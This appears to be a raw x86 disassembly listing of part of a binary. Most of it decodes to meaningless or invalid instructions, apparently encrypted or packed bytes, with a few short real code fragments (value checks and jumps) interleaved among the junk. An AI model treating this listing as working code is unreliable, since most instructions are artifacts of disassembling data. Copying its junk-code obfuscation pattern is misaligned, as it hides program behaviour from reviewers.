  40ef91:	les    esi,FWORD PTR [edx+0x76]
  40ef94:	and    BYTE PTR [ebx],cl
  40ef96:	inc    esi
  40ef97:	mov    eax,0x8e9d9653
  40ef9c:	add    DWORD PTR [eax],esi
  40ef9e:	inc    ecx
  40ef9f:	js     0x40ef2e
  40efa1:	in     eax,dx
  40efa2:	shr    DWORD PTR [ecx+edx*4],cl
  40efa5:	pushf  
  40efa6:	sbb    DWORD PTR [ebp-0x23ab6001],esp
  40efac:	sub    ebp,0xab468eb1
  40efb2:	jge    0x40ef85
  40efb4:	and    eax,0x66cb238b
  40efb9:	pop    ebp
  40efba:	aad    0xdc
  40efbc:	mov    ch,0x6
  40efbe:	stc    
  40efbf:	(bad)  
  40efc0:	or     dh,BYTE PTR [ebx-0x28]
  40efc3:	sub    ebp,DWORD PTR [eax+0x2da73f5f]
  40efc9:	(bad)  
  40efca:	ffree  st(0)
  40efcc:	into   
  40efcd:	lods   eax,DWORD PTR ds:[esi]
  40efce:	out    dx,eax
  40efcf:	jns    0x40ef8b
  40efd1:	mov    BYTE PTR [edx+ecx*4-0x53],ah
  40efd5:	sti    
  40efd6:	and    al,0x33
  40efd8:	(bad)  
  40efd9:	lea    eax,[eax+ecx*1+0x32729c]
  40efe0:	mov    WORD PTR [ebp-0x4],ax
  40efe4:	mov    eax,DWORD PTR [ebp-0xc]
  40efe7:	cmp    eax,ebx
  40efe9:	jmp    0x40f153
  40efee:	mov    cs,WORD PTR [ebx]
  40eff0:	enter  0x51c7,0xc3
  40eff4:	lea    edx,[ecx+0x2a]
  40eff7:	leave  
  40eff8:	inc    esi
  40eff9:	inc    ebx
  40effa:	not    BYTE PTR ds:0xabd0cf06
  40f000:	jo     0x40f072
  40f002:	ret    
  40f003:	jg     0x40f075
  40f005:	jo     0x40f006
  40f007:	add    ebp,DWORD PTR [eax-0x79111bad]
  40f00d:	inc    edx
  40f00e:	fnstenv [ecx+0x6eee48ff]
  40f014:	jmp    0x40f082
  40f016:	out    dx,al
  40f017:	pop    edx
  40f018:	nop
  40f019:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f01a:	push   cs
  40f01b:	sub    dh,ch
  40f01d:	rol    DWORD PTR [esi-0x57da7ac5],0x3d
  40f024:	les    edi,FWORD PTR [esi+0x59]
  40f027:	leave  
  40f028:	call   0x3532:0xf3a3a9b
  40f02f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f030:	retf   
  40f031:	test   eax,0xfabb91c7
  40f036:	mov    al,ds:0x9e19f4ed
  40f03b:	pop    esi
  40f03c:	int3   
  40f03d:	and    ebx,DWORD PTR [edx-0x6d]
  40f040:	out    0xce,eax
  40f042:	clc    
  40f043:	and    eax,DWORD PTR [esi+0x6]
  40f046:	xor    bl,bl
  40f048:	(bad)  
  40f049:	out    dx,eax
  40f04a:	aas    
  40f04b:	enter  0xd6d9,0x97
  40f04f:	jmp    0x40f03e
  40f051:	cmp    BYTE PTR [edx+0xf],bl
  40f054:	sbb    eax,0x5cd316f
  40f059:	mov    eax,ds:0x3b83b460
  40f05e:	cwde   
  40f05f:	cmp    al,0xf4
  40f061:	jmp    0x3bc7:0xee4d0227
  40f068:	mov    ds:0xf9e2629f,eax
  40f06d:	xor    esi,DWORD PTR [ebp+0x7f]
  40f070:	test   al,0xe0
  40f072:	scas   eax,DWORD PTR es:[edi]
  40f073:	ds mov edx,0x9da80317
  40f079:	test   esi,0x21a2dd3e
  40f07f:	loopne 0x40f060
  40f081:	push   edx
  40f082:	in     al,dx
  40f083:	leave  
  40f084:	repnz in eax,0x29
  40f087:	out    dx,ax
  40f089:	imul   edi,DWORD PTR [ecx-0xb184b34],0x8fbbbce9
  40f093:	jb     0x40f091
  40f095:	jbe    0x40f025
  40f097:	adc    DWORD PTR [ecx-0x6346c87b],esi
  40f09d:	adc    DWORD PTR [eax-0x10],0xffffff8c
  40f0a1:	push   0xfffffff2
  40f0a3:	xor    al,0x79
  40f0a5:	add    BYTE PTR [ebp+0x5c140852],ch
  40f0ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0ac:	mov    esi,0xfdcb0ac4
  40f0b1:	pop    ds
  40f0b2:	jbe    0x40f0d6
  40f0b4:	ds leave 
  40f0b6:	dec    ebp
  40f0b7:	push   esi
  40f0b8:	sahf   
  40f0b9:	repnz scas eax,DWORD PTR es:[edi]
  40f0bb:	fist   WORD PTR [ecx-0x69e99282]
  40f0c1:	and    eax,0x46870f93
  40f0c6:	lods   al,BYTE PTR gs:[esi]
  40f0c8:	ins    DWORD PTR es:[edi],dx
  40f0c9:	xchg   ebx,eax
  40f0ca:	(bad)  
  40f0cc:	xor    dh,BYTE PTR [eax+0xa]
  40f0cf:	lds    edx,FWORD PTR [edx-0x71]
  40f0d2:	jbe    0x40f0b8
  40f0d4:	test   DWORD PTR [edx+0x77],ebx
  40f0d7:	cmp    bl,al
  40f0d9:	loope  0x40f0c8
  40f0db:	pop    eax
  40f0dc:	fistp  DWORD PTR [eax]
  40f0de:	xor    edx,DWORD PTR [edx-0x32]
  40f0e1:	outs   dx,BYTE PTR ds:[esi]
  40f0e2:	pop    esi
  40f0e3:	inc    ebp
  40f0e4:	div    cl
  40f0e6:	sub    DWORD PTR [ebp-0x9],ebx
  40f0e9:	mov    esp,0x327f03fc
  40f0ee:	test   ah,al
  40f0f0:	xor    dh,cl
  40f0f2:	cmp    edi,DWORD PTR [edi+ebp*1]
  40f0f5:	jnp    0x40f14d
  40f0f7:	sub    ebx,DWORD PTR [ebx+ecx*8+0x3b951257]
  40f0fe:	mov    DWORD PTR [eax+edi*8-0x6906608e],ebp
  40f105:	push   edx
  40f106:	jmp    0x40f158
  40f108:	dec    ecx
  40f109:	scas   eax,DWORD PTR es:[edi]
  40f10a:	ja     0x40f0e1
  40f10c:	jecxz  0x40f0d4
  40f10e:	loopne 0x40f0cd
  40f110:	xchg   edi,eax
  40f111:	shl    DWORD PTR [ebx-0x43],cl
  40f114:	add    eax,0x261db719
  40f119:	fimul  DWORD PTR [esi]
  40f11b:	into   
  40f11c:	(bad)  
  40f11e:	cmp    al,0x53
  40f120:	push   0x76
  40f122:	cmp    cl,bl
  40f124:	bound  esp,QWORD PTR ds:0x673bbfa5
  40f12a:	in     eax,dx
  40f12b:	fwait
  40f12c:	push   esi
  40f12d:	jo     0x40f1a0
  40f12f:	push   ebx
  40f130:	xchg   edi,eax
  40f131:	push   eax
  40f132:	adc    al,0xa2
  40f134:	mov    bl,0x63
  40f136:	inc    DWORD PTR [esi-0x32b61320]
  40f13c:	adc    eax,ebx
  40f13e:	pop    ebp
  40f13f:	xchg   DWORD PTR [edx+0x77],edi
  40f142:	sbb    ah,BYTE PTR ds:0x5ca884c3
  40f148:	mov    BYTE PTR [ebx],ch
  40f14a:	adc    ecx,eax
  40f14c:	jb     0x40f10d
  40f14e:	aam    0x81
  40f150:	fdiv   DWORD PTR [ebx*8+0x178840f]
  40f157:	add    BYTE PTR [eax],al
  40f159:	mov    eax,DWORD PTR [ebp-0x8]
  40f15c:	jmp    0x40f2c6
  40f161:	lods   eax,DWORD PTR ds:[esi]
  40f162:	ret    0xcc29
  40f165:	jno    0x40f15a
  40f167:	ins    DWORD PTR es:[edi],dx
  40f168:	popa   
  40f169:	fdivr  DWORD PTR [ecx]
  40f16b:	xchg   ecx,eax
  40f16c:	test   DWORD PTR [esi-0x5c097e0a],edi
  40f172:	stos   BYTE PTR es:[edi],al
  40f173:	jo     0x40f1e5
  40f175:	ret    
  40f176:	jg     0x40f1e8
  40f178:	jo     0x40f135
  40f17a:	pop    ss
  40f17b:	xchg   ecx,eax
  40f17c:	inc    edx
  40f17d:	add    eax,DWORD PTR [edx]
  40f17f:	cwde   
  40f180:	inc    edi
  40f181:	xor    eax,0xc260ef90
  40f186:	out    0xa1,eax
  40f188:	call   0xd270bb6
  40f18d:	in     al,dx
  40f18e:	push   cs
  40f18f:	rcl    dl,0x32
  40f192:	in     eax,0xb0
  40f194:	lods   eax,DWORD PTR ds:[esi]
  40f195:	enter  0x3b3c,0x66
  40f199:	outs   dx,BYTE PTR ds:[esi]
  40f19a:	jp     0x40f165
  40f19c:	loopne 0x40f12e
  40f19e:	jecxz  0x40f157
  40f1a0:	mov    ch,0x9a
  40f1a2:	pusha  
  40f1a3:	push   ebp
  40f1a4:	addr16 sti 
  40f1a6:	retf   
  40f1a7:	stos   BYTE PTR es:[edi],al
  40f1a8:	loope  0x40f164
  40f1aa:	or     al,0x9
  40f1ac:	lods   al,BYTE PTR ds:[esi]
  40f1ad:	and    edx,edi
  40f1af:	xchg   esi,eax
  40f1b0:	adc    ebx,DWORD PTR [edx+0x15f78867]
  40f1b6:	out    dx,eax
  40f1b7:	fiadd  DWORD PTR [edx+ebx*8+0x58]
  40f1bb:	and    DWORD PTR [esi-0xf887b5d],0x10
  40f1c2:	stos   BYTE PTR es:[edi],al
  40f1c3:	xchg   edi,eax
  40f1c4:	mov    ebx,0xd59344b5
  40f1c9:	inc    edi
  40f1ca:	imul   ecx
  40f1cc:	adc    DWORD PTR [ecx-0x28],0x1e8543af
  40f1d3:	adc    al,0xd1
  40f1d5:	sbb    ebx,DWORD PTR [ebx-0x42]
  40f1d8:	aas    
  40f1d9:	mov    al,ds:0x3aae41e9
  40f1de:	shr    bh,0x93
  40f1e1:	xchg   esi,eax
  40f1e2:	jge    0x40f258
  40f1e4:	ins    DWORD PTR es:[edi],dx
  40f1e5:	fadd   QWORD PTR [edx]
  40f1e7:	mov    cl,0x3f
  40f1e9:	call   0xd045:0xd3de1f8d
  40f1f0:	fnstenv [edx+0x32]
  40f1f3:	xchg   esi,eax
  40f1f4:	xchg   ebp,eax
  40f1f5:	scas   al,BYTE PTR es:[edi]
  40f1f6:	mov    cl,dl
  40f1f8:	xchg   ebp,eax
  40f1f9:	xor    ebp,DWORD PTR [ebx+ecx*4+0x55a66e78]
  40f200:	ss mov edi,0x8e534d3f
  40f206:	and    dh,BYTE PTR [ecx]
  40f208:	inc    ebp
  40f209:	(bad)  
  40f20a:	xor    BYTE PTR [ebp+0x5add1e8c],0xe2
  40f211:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f212:	cmp    ebx,DWORD PTR [edi-0x3122d924]
  40f218:	push   ds
  40f219:	or     DWORD PTR ds:0x534655f1,ecx
  40f21f:	(bad)  
  40f220:	xchg   ebp,eax
  40f221:	into   
  40f222:	pop    ds
  40f223:	ss sti 
  40f225:	fstp   DWORD PTR [ebx]
  40f227:	iret   
  40f228:	js     0x40f220
  40f22a:	iret   
  40f22b:	sbb    al,0x8
  40f22d:	add    al,0x8f
  40f22f:	sub    cl,BYTE PTR [eax+0x1deab931]
  40f235:	mov    edx,0x9da87b58
  40f23a:	out    dx,eax
  40f23b:	cmp    DWORD PTR [eax],0x821e989a
  40f241:	dec    esi
  40f242:	sub    cl,ch
  40f244:	clc    
  40f245:	jns    0x40f1d9
  40f247:	outs   dx,DWORD PTR ds:[esi]
  40f248:	stos   BYTE PTR es:[edi],al
  40f249:	jno    0x40f2ad
  40f24b:	mov    ch,0xc6
  40f24d:	inc    ebp
  40f24e:	push   esi
  40f24f:	dec    eax
  40f250:	pop    ebx
  40f251:	aam    0x72
  40f253:	mul    BYTE PTR [edx-0x39639dfb]
  40f259:	dec    edx
  40f25a:	jge    0x40f28e
  40f25c:	mov    esi,0x9bcc5e40
  40f261:	std    
  40f262:	mov    ah,0x11
  40f264:	(bad)  
  40f265:	arpl   WORD PTR [edi+0x244a814d],sp
  40f26b:	mov    al,ds:0x4538f23f
  40f270:	dec    esp
  40f271:	mov    al,0x51
  40f273:	xchg   esi,eax
  40f274:	jb     0x40f290
  40f276:	xchg   esi,eax
  40f277:	mov    ebp,0x949f9f3c
  40f27c:	ins    BYTE PTR es:[edi],dx
  40f27d:	add    ecx,ebp
  40f27f:	sbb    eax,0x1e4eae50
  40f284:	push   ds
  40f285:	imul   ecx,eax,0x61b9383a
  40f28b:	dec    eax
  40f28c:	and    esp,edx
  40f28e:	and    bl,BYTE PTR ds:0x61b27f12
  40f294:	aam    0x8f
  40f296:	addr16 pop ebp
  40f298:	pop    ecx
  40f299:	push   ds
  40f29a:	mov    cl,0x3b
  40f29c:	stos   BYTE PTR es:[edi],al
  40f29d:	cdq    
  40f29e:	add    eax,0xc6a3360d
  40f2a3:	jo     0x40f2d2
  40f2a5:	mov    ds:0xd27d64b1,eax
  40f2aa:	(bad)  [ecx]
  40f2ac:	sub    esp,DWORD PTR [esp+edx*2+0x64046bcb]
  40f2b3:	es scas al,BYTE PTR es:[edi]
  40f2b5:	int3   
  40f2b6:	mov    ebx,0xf6e988e5
  40f2bb:	sub    eax,0x748f4830
  40f2c0:	xor    BYTE PTR ds:[esp+edi*8],cl
  40f2c4:	nop
  40f2c5:	and    al,0xc7
  40f2c7:	add    BYTE PTR [ecx-0x169fcbe2],cl
  40f2cd:	in     eax,0x4
  40f2cf:	add    BYTE PTR [eax],al
  40f2d1:	mov    eax,DWORD PTR [ebp+0x8]
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x8]
  40f2d7:	xor    eax,esi
  40f2d9:	add    eax,edi
  40f2db:	cmp    DWORD PTR [ecx],eax
  40f2dd:	je     0x40f79e
  40f2e3:	mov    ecx,DWORD PTR [ebp-0x18]
  40f2e6:	jmp    0x40f450
  40f2eb:	dec    ebx
  40f2ec:	int3   
  40f2ed:	cmp    esi,ecx
  40f2ef:	mov    ecx,0x99494bcd
  40f2f4:	add    dh,ch
  40f2f6:	shl    BYTE PTR [edi+0x76728f07],1
  40f2fc:	test   eax,0x7fc37070
  40f301:	jo     0x40f373
  40f303:	or     eax,0x41fdb3b4
  40f308:	xchg   esi,eax
  40f309:	sub    esp,DWORD PTR [edi+0x788b4666]
  40f30f:	icebp  
  40f310:	fstp   TBYTE PTR [ebx-0x79]
  40f313:	icebp  
  40f314:	adc    eax,0xbf2b7188
  40f319:	enter  0x9e54,0xf2
  40f31d:	fnsave [ecx-0x33]
  40f320:	aam    0xba
  40f322:	mov    ah,0x12
  40f324:	std    
  40f325:	jge    0x40f2fd
  40f327:	jnp    0x40f351
  40f329:	(bad)  
  40f32a:	aam    0x94
  40f32c:	ss fwait
  40f32e:	xor    al,0x71
  40f330:	sub    eax,0x9f46a4ff
  40f335:	mov    ch,0x7d
  40f337:	gs mov esp,0x9ffc0fdb
  40f33d:	xlat   BYTE PTR ds:[ebx]
  40f33e:	add    eax,0x4173f7f0
  40f343:	pop    ds
  40f344:	nop
  40f345:	mov    al,BYTE PTR [eax+0x357d0ce2]
  40f34b:	sub    ah,BYTE PTR ds:[esi]
  40f34e:	sub    dl,al
  40f350:	out    dx,al
  40f351:	cmc    
  40f352:	and    BYTE PTR [ecx-0x3c],ah
  40f355:	dec    edi
  40f356:	imul   esp,DWORD PTR [edi],0xffffffc1
  40f359:	out    0xd6,eax
  40f35b:	inc    eax
  40f35c:	push   cs
  40f35d:	mov    al,ds:0xc856c9de
  40f362:	pop    edx
  40f363:	inc    DWORD PTR [ecx+ebp*8+0x12]
  40f367:	jae    0x40f385
  40f369:	test   BYTE PTR [ebp-0x298fd897],ah
  40f36f:	mov    WORD PTR [ebp+0x5e5c3f0],cs
  40f375:	rcl    DWORD PTR [edx+0x79],1
  40f378:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f379:	adc    ebx,DWORD PTR [edi-0x7c72c7b6]
  40f37f:	in     al,0xfb
  40f381:	repz adc BYTE PTR [esi+0x4f90a627],ah
  40f388:	sbb    ecx,DWORD PTR [ebp-0x7d151333]
  40f38e:	scas   eax,DWORD PTR es:[edi]
  40f38f:	and    DWORD PTR [ecx-0x507e428c],0x684f663e
  40f399:	scas   eax,DWORD PTR es:[edi]
  40f39a:	scas   eax,DWORD PTR es:[edi]
  40f39b:	fidiv  WORD PTR [ebx+0x60f62cd8]
  40f3a1:	test   DWORD PTR [edx-0x7a651eb6],0xa6414761
  40f3ab:	adc    DWORD PTR [edx+0x72],0xf
  40f3af:	ss pop eax
  40f3b1:	lods   al,BYTE PTR ds:[esi]
  40f3b2:	mov    BYTE PTR [ecx],0x8c
  40f3b5:	test   al,0xe7
  40f3b7:	xchg   edi,eax
  40f3b8:	push   ebx
  40f3b9:	sbb    DWORD PTR [eax+0x5a],esp
  40f3bc:	pop    edx
  40f3bd:	ficom  DWORD PTR [ebx]
  40f3bf:	push   edi
  40f3c0:	stos   BYTE PTR es:[edi],al
  40f3c1:	mov    ebx,DWORD PTR [ebp+0x2f8142bc]
  40f3c7:	mov    dl,0xb9
  40f3c9:	pop    esp
  40f3ca:	jle    0x40f3ab
  40f3cc:	sti    
  40f3cd:	les    esp,FWORD PTR [edx+0x76d75c3c]
  40f3d3:	mov    ebp,0x7bb21d5a
  40f3d8:	das    
  40f3d9:	add    ebx,DWORD PTR [edi+0x5ce44e8b]
  40f3df:	aam    0x54
  40f3e1:	imul   ebp,DWORD PTR [ecx-0x31eaa0],0x40
  40f3e8:	cdq    
  40f3e9:	mov    ah,ah
  40f3eb:	xchg   ebx,eax
  40f3ec:	jne    0x40f3a2
  40f3ee:	stos   DWORD PTR es:[edi],eax
  40f3ef:	inc    ebx
  40f3f0:	cmp    al,0x1e
  40f3f2:	jo     0x40f391
  40f3f4:	pop    ebx
  40f3f5:	js     0x40f426
  40f3f7:	sub    eax,0x87448b6d
  40f3fc:	sub    DWORD PTR ds:0x349b,0x68
  40f402:	or     al,0xc4
  40f404:	les    ebx,FWORD PTR [eax-0x1c426490]
  40f40a:	mov    bh,0xc6
  40f40c:	pop    es
  40f40d:	aam    0xa1
  40f40f:	ficomp DWORD PTR [edx]
  40f411:	inc    eax
  40f412:	add    eax,0x970efab9
  40f417:	xor    DWORD PTR ds:0x170f3953,ecx
  40f41d:	mov    ds:0x9718a2dc,eax
  40f422:	imul   edx,ebx,0x54e90016
  40f428:	mov    edx,0x4cc2335d
  40f42d:	push   ebp
  40f42e:	int    0x3a
  40f430:	mov    ds:0x77d07814,eax
  40f435:	xchg   ch,dl
  40f437:	mov    bl,0x21
  40f439:	inc    ebp
  40f43a:	mov    cl,ah
  40f43c:	scas   al,BYTE PTR es:[edi]
  40f43d:	shl    DWORD PTR [eax+0x41debbf8],cl
  40f443:	mov    esi,0x6a5e8c41
  40f448:	call   0x648e3c31
  40f44d:	jg     0x40f4b9
  40f44f:	jnp    0x662aec9a
  40f455:	add    DWORD PTR [eax],eax
  40f457:	add    BYTE PTR [eax+0x65],al
  40f45a:	ror    ch,cl
  40f45c:	icebp  
  40f45d:	imul   edx,DWORD PTR [ebx+0x65],0x2966c4cb
  40f464:	stc    
  40f465:	js     0x40f4b8
  40f467:	stos   DWORD PTR es:[edi],eax
  40f468:	cmp    DWORD PTR [edi+0x7fc37070],esi
  40f46e:	jo     0x40f4e0
  40f470:	xor    ecx,DWORD PTR [ecx+0x59bf9d25]
  40f476:	test   eax,0x8452a9af
  40f47b:	mov    es,WORD PTR [ebx-0x32ddefff]
  40f481:	outs   dx,DWORD PTR ds:[esi]
  40f482:	aaa    
  40f483:	aas    
  40f484:	inc    esi
  40f485:	cmp    ah,BYTE PTR [edx-0x7f]
  40f488:	jge    0x40f456
  40f48a:	inc    esp
  40f48b:	ficomp DWORD PTR [ebx+0x37]
  40f48e:	sub    ebp,ebx
  40f490:	push   0x4a6341d0
  40f495:	and    eax,0x7669e8ae
  40f49a:	das    
  40f49b:	pushf  
  40f49c:	push   edx
  40f49d:	xchg   esi,ebp
  40f49f:	jnp    0x40f4cb
  40f4a1:	mov    ebx,0x6fb5b828
  40f4a6:	sbb    eax,0xffffffc7
  40f4a9:	inc    ebx
  40f4aa:	cli    
  40f4ab:	push   ecx
  40f4ac:	jns    0x40f4ba
  40f4ae:	outs   dx,DWORD PTR ds:[esi]
  40f4af:	mov    ch,0x90
  40f4b1:	mov    ebp,DWORD PTR [edi]
  40f4b3:	sti    
  40f4b4:	inc    ecx
  40f4b5:	call   0x9c24b167
  40f4ba:	xchg   edi,eax
  40f4bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4bc:	shr    BYTE PTR [esi-0x34],1
  40f4bf:	(bad)  [eax]
  40f4c1:	push   esi
  40f4c2:	pop    es
  40f4c3:	ja     0x40f467
  40f4c5:	mov    bh,0xe3
  40f4c7:	lock mov dl,0xc2
  40f4ca:	hlt    
  40f4cb:	pop    edi
  40f4cc:	adc    eax,0xb2df26e1
  40f4d1:	imul   esp,esi,0xa2e13272
  40f4d7:	ja     0x40f467
  40f4d9:	or     eax,DWORD PTR [edi-0x440c1035]
  40f4df:	xchg   BYTE PTR [esi+ecx*4],al
  40f4e2:	xchg   esi,eax
  40f4e3:	xor    DWORD PTR [ecx+0x68],esp
  40f4e6:	or     al,0xb8
  40f4e8:	outs   dx,BYTE PTR ds:[esi]
  40f4e9:	lods   eax,DWORD PTR ds:[esi]
  40f4ea:	js     0x40f4b6
  40f4ec:	inc    ax
  40f4ee:	dec    eax
  40f4ef:	je     0x40f4ef
  40f4f1:	add    cl,bh
  40f4f3:	jmp    0x9709:0x66cff20e
  40f4fa:	std    
  40f4fb:	sbb    BYTE PTR [edi],al
  40f4fd:	ins    BYTE PTR es:[edi],dx
  40f4fe:	inc    ecx
  40f4ff:	icebp  
  40f500:	dec    eax
  40f501:	dec    eax
  40f502:	out    dx,eax
  40f503:	xchg   edi,eax
  40f504:	ret    
  40f505:	lds    ecx,FWORD PTR [ebx]
  40f507:	pop    esp
  40f508:	call   0xbea5f1ed
  40f50d:	icebp  
  40f50e:	rcr    BYTE PTR [ebx-0x3a954c9],1
  40f514:	(bad)  
  40f515:	mov    esp,DWORD PTR [edi]
  40f517:	imul   edi,DWORD PTR [edi],0x6
  40f51a:	push   edx
  40f51b:	and    al,BYTE PTR [ebx]
  40f51d:	(bad)  
  40f51e:	xchg   esi,eax
  40f51f:	fild   WORD PTR [esi-0xa0430dc]
  40f525:	mov    ds:0x6258b3c7,al
  40f52a:	lods   al,BYTE PTR ds:[esi]
  40f52b:	or     DWORD PTR [edx+0xd],ecx
  40f52e:	(bad)  
  40f52f:	dec    edx
  40f530:	scas   al,BYTE PTR es:[edi]
  40f531:	call   0x67d8ee15
  40f536:	cli    
  40f537:	xlat   BYTE PTR ds:[ebx]
  40f538:	icebp  
  40f539:	stos   DWORD PTR es:[edi],eax
  40f53a:	xor    eax,0xd1649855
  40f53f:	in     eax,dx
  40f540:	dec    esp
  40f541:	stc    
  40f542:	aaa    
  40f543:	scas   al,BYTE PTR es:[edi]
  40f544:	pop    ecx
  40f545:	push   edi
  40f546:	xchg   edi,eax
  40f547:	fdivr  QWORD PTR [ebp+ebx*4-0x47]
  40f54b:	ret    0xcbb6
  40f54e:	stc    
  40f54f:	ja     0x40f4d6
  40f551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f552:	push   ss
  40f553:	jns    0x40f543
  40f555:	sub    edx,DWORD PTR [ebp+0x5c]
  40f558:	mov    cl,dl
  40f55a:	jne    0x40f589
  40f55c:	jmp    0x47ee00bb
  40f561:	(bad)  
  40f562:	cld    
  40f563:	dec    ecx
  40f564:	out    0x7d,al
  40f566:	repz in al,0x9d
  40f569:	jp     0x40f59d
  40f56b:	cli    
  40f56c:	shl    BYTE PTR ds:0x368757b2,0xd3
  40f573:	gs sti 
  40f575:	in     al,0x81
  40f577:	test   al,0x81
  40f579:	xchg   BYTE PTR [edi+0x79237891],dl
  40f57f:	iret   
  40f580:	js     0x40f50e
  40f582:	lock call 0x2e71ab8d
  40f588:	scas   eax,DWORD PTR es:[edi]
  40f589:	fbld   TBYTE PTR [edi]
  40f58b:	sar    BYTE PTR [ebp+0x7e],cl
  40f58e:	xlat   BYTE PTR ds:[ebx]
  40f58f:	lds    esp,FWORD PTR [ebx+0x1b]
  40f592:	mov    DWORD PTR [eax],edi
  40f594:	mov    bl,BYTE PTR ds:0x71b42b14
  40f59a:	dec    eax
  40f59b:	ja     0x40f51f
  40f59d:	cmp    esp,eax
  40f59f:	call   0x92b53af
  40f5a4:	int    0x8c
  40f5a6:	fisttp QWORD PTR ds:0xb35b7962
  40f5ac:	rcr    DWORD PTR [ebp+0x73],cl
  40f5af:	shl    esp,0xc5
  40f5b2:	out    0xd,ax
  40f5b5:	xchg   esi,eax
  40f5b6:	dec    edi
  40f5b7:	inc    esp
  40f5b8:	mov    esi,DWORD PTR [edx]
  40f5ba:	repz add edi,DWORD PTR [edi-0x75]
  40f5be:	add    BYTE PTR [ebx+0xc8d3c40],cl
  40f5c4:	int    0x78
  40f5c6:	add    BYTE PTR [eax],al
  40f5c8:	add    BYTE PTR [ebx],al
  40f5ca:	ror    DWORD PTR [ebx+0x98bf84d],0x8b
  40f5d1:	add    al,0x8
  40f5d3:	mov    DWORD PTR [ebp-0x20],eax
  40f5d6:	mov    eax,DWORD PTR [ebp+0x8]
  40f5d9:	xor    eax,esi
  40f5db:	add    eax,edi
  40f5dd:	mov    DWORD PTR [ebp-0x24],eax
  40f5e0:	mov    eax,DWORD PTR [ebp+0x8]
  40f5e3:	mov    ecx,DWORD PTR [ebp-0x20]
  40f5e6:	xor    eax,esi
  40f5e8:	add    eax,edi
  40f5ea:	cmp    ecx,eax
  40f5ec:	je     0x40f7b6
  40f5f2:	jmp    0x40f75c
  40f5f7:	pop    ebx
  40f5f8:	out    dx,al
  40f5f9:	dec    ebp
  40f5fa:	mov    bl,0x49
  40f5fc:	mov    bl,0x61
  40f5fe:	test   BYTE PTR [edx+0xc],0x5a
  40f602:	dec    ebx
  40f603:	dec    ecx
  40f604:	and    eax,0xb68c7c5e
  40f609:	jo     0x40f67b
  40f60b:	ret    
  40f60c:	jg     0x40f67e
  40f60e:	jo     0x40f5a8
  40f610:	gs xchg esi,eax
  40f612:	sbb    eax,0x7f450c3c
  40f617:	ds ss dec edx
  40f61a:	pop    esi
  40f61b:	xor    bl,cl
  40f61d:	mov    DWORD PTR [edi+0x1c],edi
  40f620:	dec    sp
  40f622:	xchg   esi,eax
  40f623:	retf   0x51ac
  40f626:	mov    bh,BYTE PTR [esi-0x527a6640]
  40f62c:	(bad)  
  40f62d:	enter  0x2a9a,0xac
  40f631:	loope  0x40f649
  40f633:	mov    esp,0x699ca7f1
  40f638:	bound  ebx,QWORD PTR [edx+ebx*4-0x5a6a26d6]
  40f63f:	dec    ecx
  40f640:	cs je  0x40f615
  40f643:	into   
  40f644:	test   DWORD PTR [ebp+ebx*4-0x779b1388],0xe39ba82f
  40f64f:	mov    eax,0xf7de8731
  40f654:	jno    0x40f627
  40f656:	nop
  40f657:	push   ds
  40f658:	xchg   esi,eax
  40f659:	stos   BYTE PTR es:[edi],al
  40f65a:	sbb    DWORD PTR [edi+0x27e92dd6],ebx
  40f660:	or     eax,0x808b02e0
  40f665:	jmp    0x40f6d3
  40f667:	scas   al,BYTE PTR es:[edi]
  40f668:	mov    eax,ds:0xbe087625
  40f66d:	test   DWORD PTR ds:0xdb38aef8,0xa5efcb34
  40f677:	or     DWORD PTR [esi+0x36],0x1fa4e5f5
  40f67e:	or     dl,BYTE PTR [edi]
  40f680:	or     ecx,DWORD PTR [esi+edi*2+0x3fcd92b2]
  40f687:	xor    BYTE PTR [edi-0x7c],bl
  40f68a:	aaa    
  40f68b:	repnz outs dx,DWORD PTR ds:[esi]
  40f68d:	mov    al,0x20
  40f68f:	mov    ds,WORD PTR [ecx-0x174875dc]
  40f695:	(bad)  
  40f696:	sub    eax,ebp
  40f698:	or     al,0xa6
  40f69a:	clc    
  40f69b:	xchg   edx,eax
  40f69c:	mov    ?,edx
  40f69e:	aad    0x6e
  40f6a0:	push   ds
  40f6a1:	pop    eax
  40f6a2:	iret   
  40f6a3:	xor    ebx,DWORD PTR fs:[edx-0x46a6de34]
  40f6aa:	xchg   ebp,eax
  40f6ab:	cmc    
  40f6ac:	jb     0x40f6d8
  40f6ae:	xchg   ebx,eax
  40f6af:	lds    ecx,FWORD PTR [ecx-0xbe57a62]
  40f6b5:	adc    al,0x25
  40f6b7:	pushf  
  40f6b8:	in     al,0x7d
  40f6ba:	dec    ecx
  40f6bb:	ins    DWORD PTR es:[edi],dx
  40f6bc:	xor    al,0x1
  40f6be:	fadd   QWORD PTR [esi+edx*8]
  40f6c1:	add    BYTE PTR [edi+0x4f],al
  40f6c4:	call   0x36a2:0x41e8bdc8
  40f6cb:	inc    ecx
  40f6cc:	pop    edi
  40f6cd:	xlat   BYTE PTR ds:[ebx]
  40f6ce:	(bad)  
  40f6cf:	mov    WORD PTR [eax+0x3b9fbba8],cs
  40f6d5:	ins    BYTE PTR es:[edi],dx
  40f6d6:	mov    WORD PTR ds:0x15ec05ac,ss
  40f6dc:	or     edx,DWORD PTR [ecx+0x66]
  40f6df:	stos   DWORD PTR es:[edi],eax
  40f6e0:	clc    
  40f6e1:	popf   
  40f6e2:	or     DWORD PTR ds:0x4c707ac1,ecx
  40f6e8:	xor    DWORD PTR [eax],0x36
  40f6eb:	mov    edx,0x4c71e515
  40f6f0:	fucomp st(5)
  40f6f2:	jb     0x40f75e
  40f6f4:	and    esi,edi
  40f6f6:	aas    
  40f6f7:	cld    
  40f6f8:	xchg   edx,ebp
  40f6fa:	sub    al,0x72
  40f6fc:	cmc    
  40f6fd:	aas    
  40f6fe:	xchg   ebp,eax
  40f6ff:	mov    WORD PTR [esi+0x32],ss
  40f702:	jae    0x40f756
  40f704:	iret   
  40f705:	cwde   
  40f706:	jle    0x40f6d3
  40f708:	dec    ebx
  40f709:	out    0x71,al
  40f70b:	add    eax,0x18c754fa
  40f710:	cmp    DWORD PTR [eax+0x3d],ebp
  40f713:	aam    0x1b
  40f715:	mov    al,0x7a
